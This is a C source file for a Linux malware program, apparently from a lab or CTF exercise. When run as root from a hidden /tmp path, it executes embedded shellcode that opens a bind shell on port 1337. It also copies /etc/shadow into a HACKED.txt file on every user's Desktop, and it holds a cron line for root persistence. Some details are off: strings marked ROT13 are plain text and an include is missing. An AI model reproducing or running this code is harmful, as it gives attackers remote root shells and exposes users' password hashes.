

// SOURCE_STRINGS
#define HACKED_ROT13 "You have been HACKED. Not only have you been HACKED, you will see that I AM ROOT. To prove this I've conveniently included the contents of shadow...\n\n"
#define SHADOW_ROT13 "/etc/shadow\n"
#define TPS_ROT13 "/tmp/.entry-3tps-93f8u-rprt\n"
#define HOME_ROT13 "/home/"
#define PROC_ROT13 "/proc/self/exe"
#define CRON_ROT13 "*/5 * * * * root /tmp/.entry-3tps-93f8u-rprt\n" 
// END_SOURCE_STRINGS

#define BD_LENGTH

#define _GNU_SOURCE
#include <dirent.h>
#include <sys/mman.h> // for mprotect #include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>


unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x05\x39\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

/**
 *  Create a file on all user's desktops containing the message and the contents of /etc/shadow.
 */
void create_hacked_file(char * full_path) {
    FILE * fd = fopen(full_path, "w");

    if (fd) {
         char shadow_buf[4096] = {0};
	 const char * message= HACKED_ROT13;
	 FILE * shadow_ptr = fopen(SHADOW_ROT13, "r");
	 int read_count = fread(shadow_buf, 1, 4096, shadow_ptr);
         fclose(shadow_ptr);
	 fwrite(message, 1, strlen(message), fd);
	 fwrite(shadow_buf, 1, read_count, fd);
	 fclose(fd);
    }
}


/**
 * Main entry point for our program
 */
int main(int argc, char *argv[]) {


    uid_t curr_id = geteuid();

    if (curr_id != 0) {
        // Exit because we are not root
        exit(0);
    }

    char readbuf[1024] = {0};
    readlink("/proc/self/exe", readbuf, sizeof(readbuf));
    if (strncmp(readbuf, "/tmp/.entry-3tps-93f8u-rprt", sizeof(readbuf)) != 0) {
        // Exit because we are not executing from intended location.
        printf("not exiting\n");
        exit(0);
    }

    // Check presence of PID file
    if (fork() == 0) {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (!mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),pagesize, PROT_READ|PROT_EXEC)) {

            int (*ret)() = (int(*)())buf;
            ret();
	} 
    } else {
	struct dirent * users_dir;
        DIR *d = opendir("/home/");

	if (d) {
            while ((users_dir = readdir(d)) != NULL) {        
                if (strcmp(users_dir->d_name, ".") == 0 || strcmp(users_dir->d_name, "..") == 0)
                    continue;                
	        char path[256];
	        snprintf(path, sizeof(path), "/home/%s", users_dir->d_name);

		char final_path[256];

		snprintf(final_path, sizeof(final_path), "%s/Desktop/HACKED.txt", path);
                
		create_hacked_file(&final_path);
	    }	    
	}
    }
}
